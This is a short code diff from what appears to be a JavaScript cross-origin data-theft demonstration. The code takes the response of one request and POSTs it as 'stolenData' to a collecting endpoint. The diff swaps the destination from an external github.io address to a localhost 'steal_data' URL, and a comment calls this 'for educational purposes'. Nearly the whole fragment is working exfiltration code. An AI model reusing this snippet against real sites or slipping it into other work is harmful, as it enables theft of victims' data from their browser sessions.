@@ -16,7 +16,8 @@
                 // Here you could send the data to your server (for educational purposes)
                 var dataToSteal = xhr.responseText;
                 var stealXhr = new XMLHttpRequest();
-                stealXhr.open('POST', 'https://perigou.github.io/domain-xml', true);
+                // Update this URL to point to your local server
+                stealXhr.open('POST', 'http://localhost:3000/steal_data', true);
                 stealXhr.setRequestHeader('Content-Type', 'application/json');
                 stealXhr.send(JSON.stringify({ stolenData: dataToSteal }));
             };
